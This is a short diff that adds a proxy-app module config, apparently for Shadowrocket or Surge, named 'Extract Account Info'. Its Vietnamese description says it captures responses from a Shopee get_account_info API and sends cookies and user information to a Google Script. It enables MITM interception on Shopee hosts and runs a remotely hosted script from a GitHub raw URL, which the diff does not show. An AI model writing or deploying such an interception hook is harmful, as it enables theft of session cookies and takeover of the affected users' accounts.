@@ -1,0 +1,9 @@
+#!name=Extract Account Info
+#!desc=Bắt API get_account_info để lấy cookie và thông tin user gửi về Google Script
+#!category=Custom
+
+[Script]
+ExtractInfo = type=http-response, pattern=^https?:\/\/.*\/account\/basic\/get_account_info, requires-body=1, max-size=3145728, script-path=https://raw.githubusercontent.com/nguyentrong1121/t-rocket/refs/heads/main/extract_sp.js, timeout=15, update-interval=86400
+
+[MITM]
+hostname = %APPEND% *.shopee.*
